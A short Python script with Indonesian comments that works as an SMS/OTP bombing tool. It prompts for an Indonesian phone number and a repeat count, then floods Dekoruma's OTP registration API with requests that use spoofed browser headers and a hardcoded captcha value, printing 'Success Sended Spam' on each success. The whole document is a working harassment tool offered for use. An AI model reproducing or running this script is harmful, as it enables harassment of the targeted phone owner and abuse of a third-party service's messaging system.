import sys          #untuk fungsi pada terminal, seperti autoclick() dan exit()
import subprocess   #installing python module within code / script (tanpa requirements.txt)

try: #import Module
    import requests #POST, GET, & PUT URL API
    import time     #Untuk Informasi Waktu
    import random   #Untuk Random User
    import os       #Untuk "clear" pada terminal
    import urllib3  #Untuk HTTP Client pada python
    import json     #Agar body Request dapat dilihat dengan cara di print
    import base64   #Untuk variasi output
    import emot     #Untuk menambahkan emot
    import shutil
finally:
    import requests
    import urllib3
    from colorama import Fore,Back,init
    from requests import get,post
    from urllib import request
    from bs4 import BeautifulSoup as bs

from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post,get # Bisa langsung "from requests import post,get"

# Inisialisasi Variasi Warna Output Terminal.
hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="\033[1;91m"
biru="\033[1;96m"

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

nomor = input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Nomor Target {W}: +62")
jum = int(input(f"{W}[{R}• {kuning}•{hijau}•{W}] {biru}Jumlah {W}: "))
for i in range(jum):
    dekor2 = requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms","captchaInput":"8Wfn"})).text
    respon = json.loads(dekor2)
    if(respon['code'] == "CAPTCHA_ERROR"):
        print (f"{W}[{R}x{W}][{R}{respon['code']}{W}][{R}Lapor Bug!🐞{R}{W}] CAPTCHA ERROR")
    elif(respon['status'] == "ok"):
        print (f"{W}[{G}✓{W}][{G}{respon['status']}{W}] Success Sended Spam")